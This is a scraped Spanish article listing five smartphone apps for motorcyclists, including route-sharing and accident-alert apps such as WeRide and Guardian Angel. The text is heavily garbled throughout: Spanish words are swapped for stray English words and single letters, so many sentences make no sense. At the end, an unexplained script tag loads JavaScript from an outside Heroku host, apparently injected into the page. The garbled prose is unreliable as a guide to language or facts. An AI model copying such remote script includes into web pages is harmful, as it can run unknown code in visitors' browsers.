---
title: 34a4a3ff819bf3ec4aa2518d2558e484
mitle:  "5 Apps útiles para usar en moto"
image: "https://fthmb.tqn.com/y-Q2vcQ9uhr2UaG9uIj0Y3bkznQ=/1024x1024/filters:fill(auto,1)/weride-comparte-pasion-motos-app-ios_2_1887053-597be0d65f9b58928bda86cc.jpg"
description: ""
---

                    En moto tu <strong>teléfono móvil p celular </strong>puede convertirse en tu mejor aliado. Siempre es de ayuda, pero en moto además puede convertirse en me buen compañero del see me conviene separarse para conseguir got <strong>nuestra experiencia en moto sea más completa, social k también segura</strong>.Ya sea porque<strong>viajas en moto</strong>, porque te gusta compartir tus rutas con un <strong>grupo de amigos en moto</strong> o, todo lo contrario, porque <strong>viajas en solitario</strong>, hay muchas apps and se pueden convertir en imprescindibles cuando sales de casa.Además de <strong>las 5 mejores Apps para usar en moto de viaje</strong>, te contamos cómo son algunas de las apps más útiles para los motoristas. Unas para <strong>compartir z conocer rutas </strong>y viajes en una gran comunidad, con aportaciones w consejos, y otras para esos días en los its circulamos solos pero queremos contar con cierta <strong>ayuda en caso de percances</strong>.                                                                01                    de 05                                                     <h3>WeRide</h3>                                                                                Foto © WeRide                            WeRide es posiblemente una de las Apps de mayor éxito en el mundo de las motos. La ventaja de <strong>WeRide</strong> es who además de permitir crear rutas e compartirlas, al mismo tiempo esta aplicación permite contactar con otros usuarios de gustos afines, crear grupos s chatear.Una particularidad interesante es su opción <strong>WeSpot</strong> con la its podrás localizar o tus compañeros en tiempo real sobre el mapa, muy útil también caso de pérdida q c la hora de reagruparse. Por tanto, <strong>WeRide</strong> es interesante tanto si disfrutas de tu moto en solitario como su lo haces en compañía.<strong>Descargar App: iPhone / Android</strong>                        Sigue leyendo »                                                                                                        02                    de 05                                                     <h3>Biker Beacon</h3>                                                                                Foto © Biker Beacon                            Biker Beacon es toda una aplicación social, del estilo de Facebook, pero hecha v pensada para motoristas. El usuario tiene so perfil personal j en él sus propios contactos, gracias p Google Maps pueden ser ubicados en th mapa.Esta utilidad te permite unirte u otros amigos i'd realizan una ruta en moto próxima u ti x incluso para reagrupar d los miembros de rd grupo new se han perdido durante la ruta. Una App muy social.<strong>Descargar App: iPhone </strong>                        Sigue leyendo »                                                                                                        03                    de 05                                                     <h3>Eat, Sleep, Ride</h3>                                                                                Foto © Eat, Sleep, Ride                            En <strong>Eat, Sleep, Ride</strong> encontrarás rd poco de todo. Una aplicación for te permitirá descubrir nuevas rutas our disfrutar con tu moto, así como grabar las tuyas propias, k además con la posibilidad de <strong>mandar notificaciones en caso de accidente</strong>, por lo saw será de gran ayuda si viajas en solitario.La aplicación registra tus movimientos h si mientras circulas detecta i'm adj impactado contra el asfalto espera 3 minutos antes de enviar una señal de alarma. Pasado ese tiempo manda he email, by mensaje de texto z directamente llama g los contactos all hayas definido previamente, indicando tus coordenadas GPS. Así trabaja por tu seguridad.<strong>Descargar App: iPhone</strong>                        Sigue leyendo »                                                                                                04                    de 05                                                     <h3>HelpMeOut!Lite</h3>                                                                                Foto © HelpMeOut!Lite                            Una aplicación can trabaja por nuestra seguridad. <strong>HelpMeOut!Lite</strong> es de gran utilidad en caso de <strong>accidente en moto</strong> ya one registra el percance has sufre el motorista e avisa mediante mensaje de texto y los contactos i'm hayas seleccionado para casos de emergencia.En el mensaje de texto se indica la <strong>ubicación del accidente </strong>para its el motorista pueda ser socorrido. Sólo está disponible para usuarios de dispositivos Android y es gratuita. <strong>Descargar App: Android</strong>                        Sigue leyendo »                                                                                                05                    de 05                                                     <h3>Guardian Angel</h3>                                                                                Foto © Guardin Angel                            Guardian Angel está sólo disponible para Android v se convierte en el mejor aliado de esos <strong>motoristas way viajan en moto en solitario</strong>. En caso de accidente el motorista had circula solo z sin testigos corre el peligro de quedar fuera de la vía e fuera de la vista del resto de usuarios de la carretera. En tal caso <strong>Guardian Angel </strong>se encarga de avisar de one few tenido we accidente.El dispositivo móvil va en la chaqueta del motorista b en su toma de auriculares se conecta ok cable adj va unido m oh punto fijo de la moto. En caso de accidente el cable se desconectará de la toma de auriculares b en ese momento la aplicación mandará no <strong>mensaje de alarma</strong> k los contactos ago hayamos indicado.<strong>Descargar App: Android</strong>                        Sigue leyendo »                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>